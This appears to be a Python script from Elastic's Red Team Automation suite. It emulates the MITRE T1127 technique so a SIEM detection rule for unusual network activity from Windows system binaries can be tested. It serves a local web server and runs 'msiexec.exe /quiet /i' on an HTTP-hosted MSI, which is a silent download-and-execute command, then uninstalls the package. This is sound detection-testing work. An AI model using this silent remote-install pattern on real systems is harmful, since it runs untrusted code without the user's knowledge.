# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: MsiExec with HTTP Installer
# RTA: msiexec_http_installer.py
# ATT&CK:
# Description: Use msiexec.exe to download an executable from a remote site over HTTP and run it.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="d90f48c5-282a-4d29-a021-fb87e220e1a5",
    platforms=["windows"],
    endpoint=[],
    siem=[
        {
            "rule_id": "1fe3b299-fbb5-4657-a937-1d746f2c711a",
            "rule_name": "Unusual Network Activity from a Windows System Binary",
        }
    ],
    techniques=["T1127"],
)


@common.requires_os(metadata.platforms)
def main():
    common.log("MsiExec HTTP Download")
    server, ip, port = common.serve_web()
    common.clear_web_cache()
    common.execute(["msiexec.exe", "/quiet", "/i", "http://%s:%d/bin/Installer.msi" % (ip, port)])
    common.log("Cleanup", log_type="-")
    common.execute(
        [
            "msiexec",
            "/quiet",
            "/uninstall",
            "http://%s:%d/bin/Installer.msi" % (ip, port),
        ]
    )

    server.shutdown()


if __name__ == "__main__":
    exit(main())
